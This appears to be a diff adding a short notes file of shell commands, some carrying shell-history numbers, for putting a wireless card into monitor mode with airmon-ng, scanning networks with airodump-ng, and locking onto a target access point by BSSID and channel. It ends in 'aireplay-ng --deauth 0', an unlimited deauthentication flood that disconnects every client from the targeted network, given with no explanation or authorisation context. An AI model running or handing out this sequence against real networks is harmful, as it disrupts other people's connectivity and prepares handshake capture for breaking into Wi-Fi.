@@ -1,0 +1,24 @@
+sudo iwconfig
+
+sudo airmon-ng check kill
+
+sudo airmon-ng start <name of net_con>
+
+
+
+##  602  sudo rfkill unblock 1
+  
+
+sudo airodump-ng <name of net_con + 'mon'>
+
+
+sudo airodump-ng --bssid <bssid> --channel <channel> <name of net_con + 'mon'>
+
+sudo aireplay-ng --deauth 0 -a <bssid> <name of net_con + 'mon'>
+
+
+
+
+  619  sudo airmon-ng check kill
+  620  sudo airmon-ng start wlo1
+
